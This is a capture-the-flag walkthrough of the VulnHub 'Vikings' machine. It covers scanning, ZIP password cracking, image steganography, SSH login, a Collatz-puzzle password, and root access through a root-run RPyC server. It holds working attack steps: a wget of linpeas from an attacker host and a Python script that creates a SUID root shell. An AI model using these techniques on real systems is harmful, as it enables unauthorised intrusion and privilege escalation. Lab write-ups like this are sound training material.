## Vikings VulnHub Challenge Writeup

### Overview

The "Vikings" VulnHub machine is a capture-the-flag (CTF) challenge that involves network reconnaissance, web enumeration, steganography, cracking a ZIP file password, SSH login, and privilege escalation through a misconfigured `rpyc_classic.py` script.

### Reconnaissance

#### Network Scanning

I started by identifying the target machine on the network using `netdiscover`.

```shellscript
netdiscover -r 192.168.1.0/24
```

The target machine was identified at `192.168.1.12` with the MAC Address `08:00:27:71:3B:AA` (PCS Systemtechnik GmbH / Oracle VirtualBox virtual NIC).

Next, I performed a comprehensive port scan using `nmap` to identify open services and their versions on the target.

```shellscript
nmap -sS -sV -Pn --min-rate=1000 --max-retries=2 192.168.1.12
```

**Results:**

- **22/tcp**: `ssh` OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
- **80/tcp**: `http` Apache httpd 2.4.29


#### Web Enumeration (Port 80)

I used `gobuster` to enumerate directories and files on the web server running on port 80.

```shellscript
gobuster dir -u http://192.168.1.12/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
```

This scan revealed a `/site` directory (Status: 301). I then focused on enumerating the `/site` directory.

```shellscript
gobuster dir -u http://192.168.1.12/site -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,bak,txt
```

This scan revealed `/site/war.txt` (Status: 200, Size: 13). I inspected its content:

```shellscript
curl http://192.168.1.12/site/war.txt
```

The content was `/war-is-over`. This looked like another path. I then accessed this path:

```shellscript
curl http://192.168.1.12/site/war-is-over
```

This returned a 301 Moved Permanently, redirecting to `http://192.168.1.12/site/war-is-over/`. I followed the redirect:

```shellscript
curl 'http://192.168.1.12/site/war-is-over/'
```

The output was a long string of base64 encoded data.

### Initial Foothold

#### Decoding Base64 and Extracting Hidden Files

I piped the base64 output to `base64 -d` and saved it to a file named `file.zip`:

```shellscript
curl 'http://192.168.1.12/site/war-is-over/' | base64 -d > file.zip
```

I attempted to unzip the file, but it required a password:

```shellscript
unzip file.zip
```

The output indicated: `skipping: king need PK compat. v5.1 (can do v4.6)`. This suggested a password-protected ZIP file.

I used `zip2john` to extract the hash from the ZIP file for cracking with John the Ripper:

```shellscript
zip2john file.zip > hash.txt
```

Then, I used `john` with the `rockyou.txt` wordlist to crack the password:

```shellscript
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

John the Ripper successfully cracked the password: `ragnarok123`.

With the password, I extracted the contents of `file.zip` using `7z`:

```shellscript
7z x file.zip
```

When prompted for the password, I entered `ragnarok123`. This extracted a file named `king`.

I checked the file type of `king`:

```shellscript
file king
```

The output was `king: JPEG image data, Exif standard...`. It was a JPEG image. I opened it to view the image.

#### Steganography and User Credentials

I suspected steganography, so I used `binwalk` to analyze the `king` image for hidden files:

```shellscript
binwalk king
```

**Results:**

```plaintext
DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             JPEG image data, EXIF standard
12            0xC             TIFF image data, big-endian, offset of first image directory: 8
1429567       0x15D03F        Zip archive data, at least v2.0 to extract, compressed size: 53, uncompressed size: 92, name: user
1429740       0x15D0EC        End of Zip archive, footer length: 22
```

`binwalk` revealed a hidden ZIP archive containing a file named `user`. I extracted it:

```shellscript
binwalk -e king
```

This created a directory `_king.extracted`. I navigated into it and viewed the `user` file:

```shellscript
cd _king.extracted
cat user
```

**Contents of `user`:**

```plaintext
//FamousBoatbuilder_floki@vikings
//f@m0usboatbuilde7
```

This file contained two potential credentials:

- Username: `floki`
- Password: `f@m0usboatbuilde7`


#### SSH Login as `floki`

I attempted to log in via SSH using the `floki` username and the discovered password:

```shellscript
ssh floki@192.168.1.12
```

When prompted for the password, I entered `f@m0usboatbuilde7`. I successfully logged in as `floki`.

```shellscript
floki@vikings:~$ ls
boat  readme.txt
floki@vikings:~$ cat readme.txt
_______________________________________________________________________
Floki-Creation____________________________________________________________________________________________________
I am the famous boat builder Floki. We raided Paris this with our all might yet we failed. We don't know where Ragnar is after the war. He is in so grief right now. I want to apologise to him.
Because it was I who was leading all the Vikings. I need to find him. He can be anywhere. I need to create this `boat` to find Ragnar
```

The `readme.txt` file mentioned "Ragnar" and a "boat". I checked the `boat` file:

```shellscript
floki@vikings:~$ cat boat
#Printable chars are your ally.
#num = 29th prime-number.
collatz-conjecture(num)
```

This file contained a hint about the "29th prime-number" and "collatz-conjecture(num)".

#### Solving the Collatz Conjecture Puzzle

I needed to find the 29th prime number and then apply the Collatz conjecture to it, keeping only printable ASCII characters.

I wrote a Python script to solve this:

```python
from sympy import prime

#getting the 29th prime
num = prime(29)

# generating collatz-conjecture sequence while keeping only printable chars
#If n is even, divide it by 2 → n = n / 2
#If n is odd, multiply it by 3 and add 1 → n = 3n + 1
nums_list = [num]
while num!=1:
    if num%2 == 0:
        num=num/2
    else:
        num=3*num+1
    nums_list.append(round(num))

output = ""
for num in nums_list:
    if 32<=num<=126:
        output+= chr(num)
print(output)
```

I ran the script on my Kali machine:

```shellscript
python3 solve_problem.py
```

The output was: `mR)|>^/Gky[gz=\.F#j5P(`

This looked like a password. I checked `/etc/passwd` on the target machine to see if there was a user named `ragnar`:

```shellscript
floki@vikings:~$ cat /etc/passwd
# ... (truncated for brevity, but ragnar user is present) ...
ragnar:x:1001:1001::/home/ragnar:/bin/sh
```

Indeed, there was a user `ragnar`. I attempted to switch to `ragnar` using the generated password:

```shellscript
floki@vikings:~$ su ragnar
Password: mR)|>^/Gky[gz=\.F#j5P(
```

I successfully switched to the `ragnar` user.

```shellscript
$ id
uid=1001(ragnar) gid=1001(ragnar) groups=1001(ragnar)
$ /bin/bash
ragnar@vikings:~$ ls
user.txt
ragnar@vikings:~$ cat user.txt
4bf930187d0149a9e4374a4e823f867d
```

This was the user flag for `ragnar`: `4bf930187d0149a9e4374a4e823f867d`.

### Privilege Escalation

As `ragnar`, I checked for `sudo` privileges:

```shellscript
ragnar@vikings:~$ sudo -l
[sudo] password for ragnar: Sorry, user ragnar may not run sudo on vikings.
```

`ragnar` did not have `sudo` privileges. I then ran `linpeas.sh` to enumerate potential privilege escalation vectors.

```shellscript
ragnar@vikings:~$ wget http://192.168.1.5/linpeas.sh
ragnar@vikings:~$ chmod +x linpeas.sh
ragnar@vikings:~$ ./linpeas.sh
```

LinPEAS output highlighted an interesting entry in `ragnar`'s `.profile` file:

```shellscript
ragnar@vikings:~$ cat .profile
# ~/.profile: executed by the command interpreter for login shells.
# This file is not read by bash(1), if ~/.bash_profile or ~/.bash_login
# exists.
# see /usr/share/doc/bash/examples/startup-files for examples.
# the files are located in the bash-doc package.
# the default umask is set in /etc/profile; for setting the umask
# for ssh logins, install and configure the libpam-umask package.
#umask 022
sudo python3 /usr/local/bin/rpyc_classic.py
# if running bash
if [ -n "$BASH_VERSION" ]; then
    # include .bashrc if it exists
    if [ -f "$HOME/.bashrc" ]; then
     . "$HOME/.bashrc"
    fi
fi
# set PATH so it includes user's private bin if it exists
if [ -d "$HOME/bin" ] ; then
    PATH="$HOME/bin:$PATH"
fi
# set PATH so it includes user's private bin if it exists
if [ -d "$HOME/.local/bin" ] ; then
    PATH="$HOME/.local/bin:$PATH"
fi
```

The line `sudo python3 /usr/local/bin/rpyc_classic.py` was particularly interesting. It indicated that `rpyc_classic.py` was being run with `sudo` (as root) when a login shell was initiated.

I inspected the `rpyc_classic.py` script:

```shellscript
ragnar@vikings:~$ cat /usr/local/bin/rpyc_classic.py
#!/usr/bin/python3
"""classic rpyc server (threaded, forking or std) running a SlaveService
usage:
    rpyc_classic.py                         # default settings
    rpyc_classic.py -m forking -p 12345     # custom settings
    # ssl-authenticated server (keyfile and certfile are required)
    rpyc_classic.py --ssl-keyfile keyfile.pem --ssl-certfile certfile.pem --ssl-cafile cafile.pem
"""
import sys
import os
import rpyc
from plumbum import cli
from rpyc.utils.server import ThreadedServer, ForkingServer, OneShotServer
from rpyc.utils.classic import DEFAULT_SERVER_PORT, DEFAULT_SERVER_SSL_PORT
from rpyc.utils.registry import REGISTRY_PORT
from rpyc.utils.registry import UDPRegistryClient, TCPRegistryClient
from rpyc.utils.authenticators import SSLAuthenticator
from rpyc.lib import setup_logger
from rpyc.core import SlaveService

class ClassicServer(cli.Application):
    mode = cli.SwitchAttr(["-m", "--mode"], cli.Set("threaded", "forking", "stdio", "oneshot"),
                          default="threaded", help="The serving mode (threaded, forking, or 'stdio' for "
                          "inetd, etc.)")
    port = cli.SwitchAttr(["-p", "--port"], cli.Range(0, 65535), default=None,
                          help="The TCP listener port (default = %s, default for SSL = %s)" %
                          (DEFAULT_SERVER_PORT, DEFAULT_SERVER_SSL_PORT), group="Socket Options")
    host = cli.SwitchAttr(["--host"], str, default="", help="The host to bind to. "
                          "The default is localhost", group="Socket Options")
    ipv6 = cli.Flag(["--ipv6"], help="Enable IPv6", group="Socket Options")
    logfile = cli.SwitchAttr("--logfile", str, default=None, help="Specify the log file to use; "
                             "the default is stderr", group="Logging")
    quiet = cli.Flag(["-q", "--quiet"], help="Quiet mode (only errors will be logged)",
                     group="Logging")
    ssl_keyfile = cli.SwitchAttr("--ssl-keyfile", cli.ExistingFile,
                                 help="The keyfile to use for SSL. Required for SSL", group="SSL",
                                 requires=["--ssl-certfile"])
    ssl_certfile = cli.SwitchAttr("--ssl-certfile", cli.ExistingFile,
                                  help="The certificate file to use for SSL. Required for SSL", group="SSL",
                                  requires=["--ssl-keyfile"])
    ssl_cafile = cli.SwitchAttr("--ssl-cafile", cli.ExistingFile,
                                help="The certificate authority chain file to use for SSL. "
                                "Optional; enables client-side authentication",
                                group="SSL", requires=["--ssl-keyfile"])
    auto_register = cli.Flag("--register", help="Asks the server to attempt registering with "
                             "a registry server. By default, the server will not attempt to register",
                             group="Registry")
    registry_type = cli.SwitchAttr("--registry-type", cli.Set("UDP", "TCP"),
                                   default="UDP", help="Specify a UDP or TCP registry", group="Registry")
    registry_port = cli.SwitchAttr("--registry-port", cli.Range(0, 65535), default=REGISTRY_PORT,
                                   help="The registry's UDP/TCP port", group="Registry")
    registry_host = cli.SwitchAttr("--registry-host", str, default=None,
                                   help="The registry host machine. For UDP, the default is 255.255.255.255; "
                                   "for TCP, a value is required", group="Registry")

    def main(self):
        if not self.host:
            self.host = "::1" if self.ipv6 else "127.0.0.1"
        if self.registry_type == "UDP":
            if self.registry_host is None:
                self.registry_host = "255.255.255.255"
            self.registrar = UDPRegistryClient(ip=self.registry_host, port=self.registry_port)
        else:
            if self.registry_host is None:
                raise ValueError("With TCP registry, you must specify --registry-host")
            self.registrar = TCPRegistryClient(ip=self.registry_host, port=self.registry_port)

        if self.ssl_keyfile:
            self.authenticator = SSLAuthenticator(self.ssl_keyfile, self.ssl_certfile,
                                                  self.ssl_cafile)
            default_port = DEFAULT_SERVER_SSL_PORT
        else:
            self.authenticator = None
            default_port = DEFAULT_SERVER_PORT

        if self.port is None:
            self.port = default_port

        setup_logger(self.quiet, self.logfile)

        if self.mode == "threaded":
            self._serve_mode(ThreadedServer)
        elif self.mode == "forking":
            self._serve_mode(ForkingServer)
        elif self.mode == "oneshot":
            self._serve_oneshot()
        elif self.mode == "stdio":
            self._serve_stdio()

    def _serve_mode(self, factory):
        t = factory(SlaveService, hostname=self.host, port=self.port,
                    reuse_addr=True, ipv6=self.ipv6, authenticator=self.authenticator,
                    registrar=self.registrar, auto_register=self.auto_register)
        t.start()

    def _serve_oneshot(self):
        t = OneShotServer(SlaveService, hostname=self.host, port=self.port,
                          reuse_addr=True, ipv6=self.ipv6, authenticator=self.authenticator,
                          registrar=self.registrar, auto_register=self.auto_register)
        t._listen()
        sys.stdout.write("rpyc-oneshot\n")
        sys.stdout.write("%s\t%s\n" % (t.host, t.port))
        sys.stdout.flush()
        t.start()

    def _serve_stdio(self):
        origstdin = sys.stdin
        origstdout = sys.stdout
        sys.stdin = open(os.devnull, "r")
        sys.stdout = open(os.devnull, "w")
        sys.stderr = open(os.devnull, "w")
        conn = rpyc.classic.connect_pipes(origstdin, origstdout)
        try:
            try:
                conn.serve_all()
            except KeyboardInterrupt:
                print("User interrupt!")
        finally:
            conn.close()

if __name__ == "__main__":
    ClassicServer.run()
```

The `rpyc_classic.py` script runs an RPyC (Remote Python Call) server. The `.profile` entry means this server is started as root. If I can connect to this RPyC server, I can execute arbitrary Python code as root.

I checked the active ports to see if the RPyC server was listening:

```shellscript
ragnar@vikings:~$ netstat -tulnp | grep python
```

This command would show if a Python process was listening on a port. From the `viminfo` file of `floki`, I saw a line: `python3 /usr/local/bin/rpyc_classic.py`. This indicated that the RPyC server was likely running on its default port, which is `18812`.

I created a simple Python script to connect to the RPyC server and execute a command:
```python
import rpyc
conn = rpyc.classic.connect("localhost", 18812)
output = conn.modules.subprocess.check_output(["id"])
print(output.decode())
```

I ran this script:

```shellscript
ragnar@vikings:~$ python3 script.py
```

The output was `uid=0(root) gid=0(root) groups=0(root)`, confirming that I could execute commands as root through the RPyC server.

Now, I used this capability to create a SUID shell. I modified `script.py` to copy `/bin/bash` to `/tmp/rootsh` and set the SUID bit:

```python
import rpyc
conn= rpyc.classic.connect("localhost",18812)
conn.modules.os.system("cp /bin/bash /tmp/rootsh && chmod +s /tmp/rootsh")

```

I ran the script:

```shellscript
ragnar@vikings:~$ python3 script.py
```

Then, I verified the SUID bit on `/tmp/rootsh`:

```shellscript
ragnar@vikings:~$ ls -la /tmp
# ... (truncated for brevity) ...
-rwsr-sr-x  1 root   root   1113504 Jul 14 14:17 rootsh
# ... (truncated for brevity) ...
```

The `rwsr-sr-x` permissions confirmed that `rootsh` was now a SUID binary owned by root. I executed it:

```shellscript
ragnar@vikings:~$ /tmp/rootsh -p
```

The `-p` flag is important to ensure that the effective UID (euid) is preserved, allowing the shell to run with root privileges.

```shellscript
rootsh-4.4# id
uid=1001(ragnar) gid=1001(ragnar) euid=0(root) egid=0(root) groups=0(root),1001(ragnar)
```

I had successfully escalated privileges to root!

### Root Flag

With root privileges, I navigated to the `/root` directory to find the final flag.

```shellscript
rootsh-4.4# cd /root
rootsh-4.4# ls
root.txt
rootsh-4.4# cat root.txt
f0b98d4387ff6da77317e582da98bf31
```

**Root Flag:** `f0b98d4387ff6da77317e582da98bf31`

### Tools Used

- `netdiscover` - Network discovery
- `nmap` - Port scanning and service version detection
- `gobuster` - Directory and file enumeration
- `curl` - Interacting with web services
- `base64` - Decoding base64 encoded data
- `zip2john` - Converting ZIP files to hash format
- `john` - Cracking password hashes
- `7z` - Extracting ZIP files
- `file` - Identifying file types
- `binwalk` - Extracting hidden files from images (steganography)
- `ssh` - Secure shell access
- `python3` - Running custom scripts for RPyC exploitation
- `linpeas.sh` - Linux privilege escalation enumeration script
- `netstat` - Checking network connections and listening ports
- `su` - Switching user


### Flags Found

1. **User Flag (floki):** `f@m0usboatbuilde7` (password for floki)
2. **User Flag (ragnar):** `4bf930187d0149a9e4374a4e823f867d`
3. **Root Flag:** `f0b98d4387ff6da77317e582da98bf31`


SuggestionsClose suggestions[data-radix-scroll-area-viewport]{scrollbar-width:none;-ms-overflow-style:none;-webkit-overflow-scrolling:touch;}[data-radix-scroll-area-viewport]::-webkit-scrollbar{display:none}Add IntegrationLearn more about RPyC exploitationPractice steganography techniquesUnderstand SUID binaries and their exploitationExplore other LinPEAS findingsSet up a similar vulnerable VMScroll leftScroll right
